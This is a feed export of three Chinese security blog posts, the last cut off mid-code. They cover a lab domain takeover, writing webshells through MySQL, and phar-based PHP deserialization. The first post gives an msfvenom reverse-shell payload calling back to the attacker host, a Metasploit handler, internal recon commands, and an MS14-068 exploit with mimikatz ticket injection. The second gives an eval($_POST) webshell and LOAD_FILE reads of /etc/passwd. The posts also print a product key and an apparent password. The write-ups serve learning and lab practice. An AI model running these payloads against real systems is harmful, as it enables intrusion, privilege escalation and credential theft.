    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近找工作，发现光打CTF不足以应对企业的需求，很多都会问一些内网渗透方面的知识。而我之前内网渗透这一块一直没怎么涉及，虽然有点晚的，但是确实需要补一补，认真学习内网渗透。另外后面打算做成一个系列，内网渗透的入门到实战之类的。</p><h1 id="渗透常见概念"><a href="#渗透常见概念" class="headerlink" title="渗透常见概念"></a>渗透常见概念</h1><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><blockquote><p>​    局域网（Local Area Network, LAN），又称内网。内网的计算机以NAT（网络地址转换）协议，通过一个公共的网关访问Internet。内网的计算机可向Internet上的其他计算机发送连接请求，但Internet上其他的计算机无法向内网的计算机发送连接请求。</p></blockquote><h2 id="域和域控制器"><a href="#域和域控制器" class="headerlink" title="域和域控制器"></a>域和域控制器</h2><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><blockquote><p>​    域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系（即Trust Relation）。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p></blockquote><blockquote><p>​    域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域；每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p></blockquote><blockquote><p>​    域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</p></blockquote><h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><blockquote><p>​    不过在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。</p></blockquote><blockquote><p>​    域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p></blockquote><h1 id="域渗透AD环境搭建"><a href="#域渗透AD环境搭建" class="headerlink" title="域渗透AD环境搭建"></a>域渗透AD环境搭建</h1><ul><li>域控制器：<a href="ed2k://%7Cfile%7Ccn_win_srv_2003_r2_standard_x64_with_sp2_vl_cd1_X13-47363.iso%7C646281216%7C401FEF8B592F58BDAE69821512FA9681%7C/">windows server r2 standard</a><ul><li><a href="https://wenku.baidu.com/view/d05d73156edb6f1aff001f73.html">序列号</a> 简体中文标准版</li><li>PCGCG-MP77F-9DBC9-QHW44-TDBRD</li></ul></li><li>域用户：win7</li></ul><p>单域的环境还是比较简单的，网上搭建的教程也是比较多，因为我也是刚入门只搭了一个简单的一个域控制器DC+一个win7的域用户。</p><p>搭建教程可以参考这两篇文章：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/31957064">知乎-域渗透初探（二）：域环境搭建</a></li><li><a href="https://www.cnblogs.com/-qing-/p/11193805.html">域渗透基础之环境搭建(单域到组件域林)</a></li></ul><p>我就简单说一下关键点和我踩到的坑：</p><ol><li><p>改两个的计算机名，后面比较方便</p></li><li><p>虚拟机搭建的情况下（大部分应该都是吧），虚拟机设置中得网络换成桥接。设置好IP使两台虚机在同一个局域网内，通过ip地址互ping能ping通，通过机器名也能ping通，ping域控服务器的计算器全名(带域后缀)也要ping的通。</p><p><img src="https://i.loli.net/2020/03/20/wzbN9FjsC17TZIM.png"></p></li><li><p>一直提示<strong>密码设置不符合要求</strong>或者<strong>第一次登陆需要更改密码</strong>有一直解决不了的话，可以考虑更改域控制器安全策略。参考<a href="https://blog.csdn.net/ZebraChroma/article/details/82896194">域用户无法修改密码问题的解决方案</a></p><p><img src="https://i.loli.net/2020/03/20/8pj1XwyLgBPlMFn.png"></p></li><li><p>分配内存的时候根据自己的机器来，分配少一点，比如总共8G(推荐16G)，可以各分1G，分的太多容易导致物理机崩溃。多渗透环境的话，可能还是需要16G以上内存才能跑得起来。。。</p></li></ol><p>其他好像没什么，按照教程来就行。</p><p><strong>测试的域环境结构</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域：pentestlab.com</span><br><span class="line">域控：windows Server 2003 R2，IP: 192.168.0.105</span><br><span class="line">域成员：windows 7x64,IP: 192.168.0.106</span><br><span class="line">攻击者：kaliLinux IP: 192.168.0.108 </span><br></pre></td></tr></table></figure><h1 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h1><h2 id="win7反弹shell"><a href="#win7反弹shell" class="headerlink" title="win7反弹shell"></a>win7反弹shell</h2><p>假设控制了域网内的一台电脑，要将权限从local admin 提高到Domain admin，访问包括Domain Controller在内的域内中任何一台电脑</p><p>首先得拿到一个shell</p><ul><li>上传Metasploit的反弹马，shell下执行命令</li></ul><p>生成反弹马（用exe的）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.108 LPORT&#x3D;23333 -f exe &gt; .&#x2F;Desktop&#x2F;re.exe</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/1XP8pcbuCnimOdW.png"></p><p>msfconsole设置监听并启动</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.108</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set port 23333</span><br><span class="line">port &#x3D;&gt; 23333</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/yqoGbeCRz6Jg8vr.png"></p><p>shell有中文，所以存在乱码（但是没有关系）</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到shell后，进行必要的信息收集。</p><p><a href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></p><p>常见的信息收集命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE% //查看系统版本位数</span><br><span class="line"></span><br><span class="line">netstat -ano //查看开放的端口</span><br><span class="line"></span><br><span class="line">net config Workstation //当前计算机名，全名，用户名，系统版本，工作站域，登陆域</span><br><span class="line"></span><br><span class="line">net user /domain b404 pass //修改域内用户密码，需要管理员权限</span><br><span class="line"></span><br><span class="line">tasklist /S IP地址 /U 域名\用户名 /P /V  //查看远程计算机进程</span><br><span class="line"></span><br><span class="line">tasklist /svc //查看进程</span><br><span class="line"></span><br><span class="line">taskkill /im 进程名称(cmd.exe) //结束进程</span><br><span class="line"></span><br><span class="line">taskkill /pid[进程码] //-t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line"></span><br><span class="line">ipconfig /all //用来查看当前机器的网络环境,判断是工作组,还是域环境.网段是怎么划分的,每个段有多少台机器,DNS服务器IP是多少。</span><br><span class="line"></span><br><span class="line">net view//用来查看跟本机有关联的机器名.注意,是跟本机有关联的机器,而不是一个段的机器.</span><br><span class="line"></span><br><span class="line">net view /domain//用来查看当前网络环境存在几个域.</span><br><span class="line"></span><br><span class="line">net view /domain:xxxx//查看xxx域中存在的跟本机有关联的机器.</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain//查看域内管理员.</span><br><span class="line"></span><br><span class="line">net user /domain//查看域内的用户名.</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; /domain//查看域内所有机器名.</span><br><span class="line"></span><br><span class="line">net time /domain//查看域时间及域服务器的名字</span><br><span class="line"></span><br><span class="line">Nslookup -type=SRV _ldap._tcp.//查询DNS</span><br><span class="line"></span><br><span class="line">netstat//查看连接信息.</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Controllers&quot; /domain//查找域控</span><br><span class="line"></span><br><span class="line">nbtstat//由IP地址得到机器名</span><br><span class="line"></span><br><span class="line">ping 扫描内网存活主机：</span><br><span class="line">for /l %i in (1,1,255) do @ping 192.168.200.%i -w 1 -n 1 | find /i&quot;ttl&quot;</span><br><span class="line"></span><br><span class="line">查看是否支持PowerShell：</span><br><span class="line">if defined PSModulePath (echo support powershell) else (echo not support powershell)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/JZrvnBcjYQUupVD.png"></p><p>得到一些信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域：pentestlab.com</span><br><span class="line">域控制器：DCSERVER</span><br><span class="line">主机:Win7-PC1</span><br><span class="line"></span><br><span class="line">IPs：</span><br><span class="line">192.168.0.1 &#x2F;&#x2F;可能是网关</span><br><span class="line">192.168.0.105 </span><br><span class="line">192.168.0.106 &#x2F;&#x2F;win7主机，可控</span><br><span class="line">192.168.0.108 &#x2F;&#x2F;攻击机</span><br><span class="line">&#x2F;&#x2F;实际环境下应该还存在很多存活的主机，无法通过这样就简单确定域控制器的IP。</span><br><span class="line"></span><br><span class="line">支持powershell</span><br><span class="line"></span><br><span class="line">某些端口开启：</span><br><span class="line">80(web服务),443(https),135(RPC),3306(mysql),3389(windows远程连接)</span><br></pre></td></tr></table></figure><h2 id="从local-admin到domain-admin"><a href="#从local-admin到domain-admin" class="headerlink" title="从local admin到domain admin"></a>从local admin到domain admin</h2><p>我们利用MS14-068漏洞提升普通用户的权限为与管理员（Domain admin）的身份。</p><p>详细原理参考：<a href="http://www.freebuf.com/vuls/56081.html">深入解读MS14-068漏洞</a></p><blockquote><p>该漏洞利用Kerberos协议的算法和信息存放以及任意签名问题</p><p>Kerberos协议是一种基于第三方可信主机的计算机网络协议，它允许两个实体之间在非安全网络环境（可能被窃听、被重放攻击）下以一种安全的方式证明自己的身份。</p></blockquote><p>攻击工具: <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p><p>利用该工具需要：</p><ol><li><p>SID:</p><p><img src="https://i.loli.net/2020/03/20/fZ3SINgrTqQRJep.png"></p></li><li><p>域控制器名称和域名称：DCServer</p></li><li><p>python环境（测试使用python2.7.14）</p></li></ol><p>获取TGT并且清除缓存票据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u Win7-PC1@pentestlab.com -p V0Wldl19980114 -s S-1-5-21-2650578945-2920865233-32666330-1107 -d DCServer.pentestlab.com</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/L4SaPes5rgB89Dq.png"></p><p>注入TGT，注意注入TGT时，需要将上一步得到的票据放到相应的目录。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_Win7-PC1@pentestlab.com.ccache&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/PjARhBCO5wDQpIZ.png"></p><p><img src="https://i.loli.net/2020/03/20/Ok7WKivzXlC1pFr.png"></p><p>访问域控DCServer的资源<code>\\DCServer\c$</code>，把shell——re.exe放到c盘目录，准备用这个文件反弹shell。</p><p><img src="https://i.loli.net/2020/03/20/bmxq4SyKI8AotYZ.png"></p><p>添加定时任务，反弹shell，成功获取域控的system权限。</p><p><img src="https://i.loli.net/2020/03/20/58j6zSu1b7IVRZm.png"></p><p><img src="https://i.loli.net/2020/03/20/3zjSBbfn9y6XQeZ.png"></p><h1 id="总结与后记"><a href="#总结与后记" class="headerlink" title="总结与后记"></a>总结与后记</h1><p>本文主要是通过一个<code>MS14-068</code>漏洞复现了一个简单域渗透的情景，初窥域渗透和内网渗透。内网渗透确实博大精深，内容很多，知识很杂，听说到更精深的情况是能够自己写免杀和新漏洞的PoC，这甚至还需要二进制的知识。也是希望自己能够通过像这样不断的学习和总结，逐渐摸到门道，慢慢摸索经验，一步步深入吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近找工作，发现光打CTF不足以应对企业的需求，很多都会问一些内网渗透方面的知识。而我之前内网渗透这一块一直没怎么涉及，虽然有点晚的，但是确</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://v0w.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="http://v0w.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>mysql写shell的一点总结</title>
    <link href="http://v0w.top/2020/03/14/mysql-getshell/"/>
    <id>http://v0w.top/2020/03/14/mysql-getshell/</id>
    <published>2020-03-13T16:00:00.000Z</published>
    <updated>2020-08-11T02:15:12.016Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>利用SQL注入，当存在一定的利用条件时，我们可以利用mysql进行文件的写入，在知道网站绝对路径的情况下，可以通过这种方式写入shell。</p><h1 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h1><ol><li><p>数据库当前用户为root权限或者至少有FILE权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select file_priv,user,host from mysql.user;</span><br><span class="line">+-----------+------+-----------+</span><br><span class="line">| file_priv | user | host      |</span><br><span class="line">+-----------+------+-----------+</span><br><span class="line">| Y         | root | localhost |</span><br><span class="line">| Y         | root | 127.0.0.1 |</span><br><span class="line">| Y         | root | ::1       |</span><br><span class="line">+-----------+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>知道当前网站的绝对路径</p></li><li><p>php的gpc为off状态, 在开启gpc的情况下，可以通过十六进制的路径读写文件</p></li><li><p>写入的那个路径存在写权限</p></li><li><p><code>secure_file_priv=&#39;&#39;</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@secure_file_priv;</span><br><span class="line">+-----------------------+</span><br><span class="line">| @@secure_file_priv    |</span><br><span class="line">+-----------------------+</span><br><span class="line">| &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F; |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">secure_file_priv可以设置如下这样进行设置：</span><br><span class="line">1. 设置为空，那么对所有路径均可进行导入导出。</span><br><span class="line">2. 设置为一个目录名字，那么只允许在该路径下导入导出。</span><br><span class="line">3. 设置为Null，那么禁止所有导入导出。</span><br><span class="line"></span><br><span class="line">需要在mysql的配置文件中更改：</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure></li></ol><h1 id="0x02-读取web路径"><a href="#0x02-读取web路径" class="headerlink" title="0x02 读取web路径"></a>0x02 读取web路径</h1><h2 id="2-1-利用报错"><a href="#2-1-利用报错" class="headerlink" title="2.1 利用报错"></a>2.1 利用报错</h2><p>有时候<code>information_schema.tables</code>不能用时，在<strong>MySQL 5.6</strong>及以上版本中可以使用以下表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union select 1,group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;schema()%23&amp;Submit&#x3D;Submit%23</span><br><span class="line">?id&#x3D;1&#39; union select 1,group_concat(table_name) from mysql.innodb_index_stats where database_name&#x3D;schema()%23&amp;Submit&#x3D;Submit%23</span><br></pre></td></tr></table></figure><h2 id="2-2-phpinfo"><a href="#2-2-phpinfo" class="headerlink" title="2.2 phpinfo"></a>2.2 phpinfo</h2><p><img src="https://i.loli.net/2020/03/22/vBiFuHg7pAKL2Ps.png"></p><h2 id="2-3-load-file读配置文件"><a href="#2-3-load-file读配置文件" class="headerlink" title="2.3 load_file读配置文件"></a>2.3 load_file读配置文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;default&#39;);</span><br></pre></td></tr></table></figure><p>有时候过滤了敏感路径可以试试这样：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;otherdir&#x2F;..&#x2F;passwd&#39;);</span><br></pre></td></tr></table></figure><h2 id="2-4-通过mysql函数和全局变量-查找mysql安装目录"><a href="#2-4-通过mysql函数和全局变量-查找mysql安装目录" class="headerlink" title="2.4 通过mysql函数和全局变量 查找mysql安装目录"></a>2.4 通过mysql函数和全局变量 查找mysql安装目录</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+-----------+</span><br><span class="line">| @@basedir |</span><br><span class="line">+-----------+</span><br><span class="line">| &#x2F;usr&#x2F;     |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@datadir;</span><br><span class="line">+-----------------+</span><br><span class="line">| @@datadir       |</span><br><span class="line">+-----------------+</span><br><span class="line">| &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &#39;datadir&#39;;</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| Variable_name | Value           |</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| datadir       | &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; |</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><blockquote><p>@@ 用于系统变量</p><p>@ 往往用于用户定义的变量</p></blockquote><h1 id="0x03-常见方法写shell"><a href="#0x03-常见方法写shell" class="headerlink" title="0x03 常见方法写shell"></a>0x03 常见方法写shell</h1><h2 id="3-1-select-into"><a href="#3-1-select-into" class="headerlink" title="3.1 select * into"></a>3.1 select * into</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select &#39;&lt;? phpinfo(); ?&gt;&#39; into outfile &#39;E:&#x2F;1.txt&#39;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#39;&lt;? phpinfo(); ?&gt;&#39; into outfile &#39;E:&#x2F;1.txt&#39;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="3-2-基于log日志写shell法"><a href="#3-2-基于log日志写shell法" class="headerlink" title="3.2 基于log日志写shell法"></a>3.2 基于log日志写shell法</h2><blockquote><p><a href="http://sh1yan.top/2018/05/26/mysql-writ-shell/">http://sh1yan.top/2018/05/26/mysql-writ-shell/</a></p><p>查询当前mysql下log日志的默认地址，同时也看下log日志是否为开启状态，并且记录下原地址，方便后面恢复。</p><p><code>set global general_log = on;</code><br>开启日志监测，一般是关闭的，如果一直开，文件会很大的。</p><p><code>set global general_log_file = ‘G:/2.txt’;</code><br>这里设置我们需要写入的路径就可以了。</p><p><code>select ‘&lt;?php eval($_POST[‘shiyan’]);?&gt;’;</code><br>查询一个一句话，这个时候log日志里就会记录这个。</p><p><code>set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;</code><br>结束后，再修改为原来的路径。</p><p><code>set global general_log = off;</code><br>关闭下日志记录。</p></blockquote><p><img src="https://i.loli.net/2020/03/22/Sj5szw37rNXHuDm.png" alt="20200322145847.png"></p><h2 id="3-3-创建表，导出数据"><a href="#3-3-创建表，导出数据" class="headerlink" title="3.3 创建表，导出数据"></a>3.3 创建表，导出数据</h2><p>其实和第一种方法差不多。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use test;</span><br><span class="line">drop table if exists vow;</span><br><span class="line">create table vow(name text not null);</span><br><span class="line">insert into vow(name) values(&#39;&lt;?php phpinfo(); ?&gt;&#39;);</span><br><span class="line">select name from vow into outfile &#39;E:&#x2F;5.txt&#39;;</span><br><span class="line">drop tables vow;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;利用SQL注入，当存在一定的利用条件时，我们可以利用mysql进行文件的写入，在知道网站绝对路径的情</summary>
      
    
    
    
    <category term="Web安全" scheme="http://v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="webshell" scheme="http://v0w.top/tags/webshell/"/>
    
    <category term="mysql" scheme="http://v0w.top/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>phar扩展php反序列化的攻击面</title>
    <link href="http://v0w.top/2020/03/12/phar-unsearise/"/>
    <id>http://v0w.top/2020/03/12/phar-unsearise/</id>
    <published>2020-03-11T16:00:00.000Z</published>
    <updated>2020-07-18T10:39:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学校的seaii表哥在404发了一篇paper——<a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p>分析了php反序列与phar的结合，大大拓展了反序列化的攻击面，我也重新审视这个漏洞，发现真的很有意思，并且有较大的杀伤力。之前分析过了<strong>php反序列化与POP链</strong>，本文就主要分析一下如何利用phar来扩展php反序列化的攻击面，并从源码角度来看一下为什么很多文件操作函数可以触发phar的反序列化。（另外膜拜一下seaii哥，啥时候能像seaii哥这么优秀啊。。。）</p><p>利用phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。</p><h1 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h1><p>详细的文件结构这一查看php文档——<a href="https://www.php.net/manual/en/phar.fileformat">What makes a phar a phar and not a tar or a zip?</a></p><h2 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h2><p>可以理解为一个标志，phar前面内容不限，但必须以<code>__HALT_COMPILER();</code>来结尾(<code>?&gt;</code>可以省略也可以包含)，否则phar扩展将无法识别这个文件为phar文件。</p><h2 id="a-manifest-describing-the-contents（一个描述内容的清单）"><a href="#a-manifest-describing-the-contents（一个描述内容的清单）" class="headerlink" title="a manifest describing the contents（一个描述内容的清单）"></a>a manifest describing the contents（一个描述内容的清单）</h2><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><table><thead><tr><th align="left">Size in bytes</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">4 bytes</td><td align="left">phar清单的长度(以字节为单位)(1 MB limit)</td></tr><tr><td align="left">4 bytes</td><td align="left">Phar中的文件数</td></tr><tr><td align="left">2 bytes</td><td align="left">Phar清单的API版本 (currently 1.0.0)</td></tr><tr><td align="left">4 bytes</td><td align="left">全局的phar位示图标志</td></tr><tr><td align="left">4 bytes</td><td align="left">phar的别名长度</td></tr><tr><td align="left">??</td><td align="left">phar的位示图长度</td></tr><tr><td align="left">4 bytes</td><td align="left">phar元数据长度（0表示无）</td></tr><tr><td align="left">??</td><td align="left">序列化的phar元数据，以**serialize()**格式存储</td></tr><tr><td align="left">只要24*条目字节数</td><td align="left">每个文件的条目</td></tr></tbody></table><h2 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h2><p>被压缩文件的内容</p><h2 id="可选-验证phar完整性的签名"><a href="#可选-验证phar完整性的签名" class="headerlink" title="[可选] 验证phar完整性的签名"></a>[可选] 验证phar完整性的签名</h2><p>签名，放在文件末尾，格式如下：</p><table><thead><tr><th align="left">Length in bytes</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">16 or 20 bytes</td><td align="left">实际签名，SHA1签名为20字节，MD5签名为16字节，SHA256签名为32字节，SHA512签名为64字节。</td></tr><tr><td align="left">4 bytes</td><td align="left">签名标志. <em>0x0001</em> 用于表示是 MD5 签名, <em>0x0002</em> 用来表示是 SHA1 签名, <em>0x0004</em> 用来表示是SHA256签名, <em>0x0008</em>用来表示是SHA512签名。 API版本1.1.0引入了SHA256和SHA512签名支持。</td></tr><tr><td align="left">4 bytes</td><td align="left">Magic <em>GBMB</em> 用于定义签名的存在</td></tr></tbody></table><h1 id="构造一个phar文件"><a href="#构造一个phar文件" class="headerlink" title="构造一个phar文件"></a>构造一个phar文件</h1><h2 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h2><p>根据文件结构，自己来构造一个phar文件，php内置了一个phar类处理的相关操作。</p><blockquote><p>注意：要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件。</p></blockquote><p>phar.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="comment">//__HALT_COMPILER(); 也是可以的</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/15/t6eI95JmQZ4Cw1L.png"></p><p>meta-data是用反序列化形式存储的。</p><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><table><thead><tr><th>受影响的函数列表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>filename</td><td>filectime<br />(获取文件的inode更改时间)</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup<br />(获取文件的组名)</td><td>fopen</td></tr><tr><td>fileinode<br />（获取文件inode）</td><td>filemtime<br />（获取文件的修改时间）</td><td>fileowner</td><td>fileperms<br />（获取文件权限）</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link<br />（判断文件名是否为符号链接）</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file<br />（解析配置文件）</td></tr><tr><td>copy</td><td>unlink</td><td>stat<br />（获取文件相关信息）</td><td>readfile<br />（输入文件内容）</td></tr></tbody></table><p>试一下，文件操作函数，能否自动对其进行反序列化：</p><p><code>test.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Destruct called\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;wakeup called\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">    <span class="comment">//file_exists($filename);</span></span><br><span class="line">    <span class="comment">//file($filename);</span></span><br><span class="line"><span 